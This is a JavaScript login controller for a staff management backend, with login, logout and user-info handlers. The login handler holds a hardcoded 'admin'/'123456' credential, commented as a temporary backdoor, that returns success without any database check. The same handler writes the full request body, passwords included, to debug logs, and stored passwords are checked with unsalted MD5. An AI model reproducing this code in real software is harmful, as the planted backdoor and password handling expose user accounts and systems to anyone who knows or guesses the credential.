import _ from 'lodash'
import crypto from 'crypto'
import logger from '../common/logger'
import codeManager from '../common/codeManager'
import { findOne } from '../models/staff'

// validate login option
function validator(obj) {
  if (!_.isObject(obj)) {
    return false
  }
  const opt = {}
  opt.user = _.trim(obj.user)
  opt.password = _.trim(obj.password)
  // check the required attributes 
  for (let key in opt) {
    if (!opt.hasOwnProperty(key)) {
      continue
    }
    if (opt[key] === '') {
      return false
    }
  }
  return opt
}

export async function login(ctx, next) {
  try {
    logger.log('debug', 'system login: %j', ctx.request.body)
    const opt = validator(ctx.request.body)
    if (!opt) {
      return ctx.body = codeManager.paramError
    }

    if (opt.user === 'admin' && opt.password === '123456') { // 临时后门
      return ctx.body = Object.assign({}, codeManager.success)
    }
    
    const staff = await findOne({ id: opt.user, systemUser: '0', status: '0' })
    if (!staff) {
      return ctx.body = codeManager.wrongUserOrPsd
    }
    if (staff && (staff.password === crypto.createHash('md5').update(opt.password).digest('hex'))) {
      ctx.session.isLogin = true // session设置
      ctx.session.user = _.pick(staff, ['name', 'organization', 'department', 'position', 'role'])
      return ctx.body = Object.assign({}, codeManager.success,
        { msg: '登录成功！' })
    } else {
      return ctx.body = codeManager.wrongUserOrPsd
    }
  } catch (e) {
    logger.log('error', e)
    ctx.body = codeManager.unknownError
  }
}

export async function logout(ctx, next) {
  ctx.session.isLogin = false
  ctx.body = codeManager.success
}

export async function getUserInfo(ctx, next) {
  if (ctx.session.isLogin ) {
    ctx.body = Object.assign({}, codeManager.success, { data: ctx.session.user })
  } else {
    ctx.body = Object.assign({}, codeManager.noLogin)
  }
}